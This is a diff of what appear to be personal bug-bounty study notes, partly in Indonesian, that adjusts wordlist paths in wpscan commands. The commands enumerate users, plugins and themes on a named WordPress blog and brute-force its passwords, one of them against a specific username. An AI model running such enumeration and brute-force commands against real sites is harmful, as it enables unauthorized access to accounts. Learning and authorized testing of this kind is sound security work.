@@ -31,8 +31,8 @@ wpscan --url https://blog.onevasco.com --enumerate u1-100
 wpscan --url https://blog.onevasco.com --enumerate vp,p,t,u
 
 # Password brute force attack
-wpscan --url https://blog.onevasco.com -e u --passwords ~/belajar/bug_bounty/Tools/wordlists/SecLists/password/Common-Credentials/best1050.txt
+wpscan --url https://blog.onevasco.com -e u --passwords /wordlists/SecLists/password/Common-Credentials/best1050.txt
 
 # BruteForce degna usernme telah di ketahui
-wpscan --url https://blog.onevasco.com --usernames ovauthor --passwords ~/belajar/bug_bounty/Tools/wordlists/SecLists/password/Common-Credentials/best1050.txt
+wpscan --url https://blog.onevasco.com --usernames ovauthor --passwords /wordlists/SecLists/password/Common-Credentials/best1050.txt
 ```
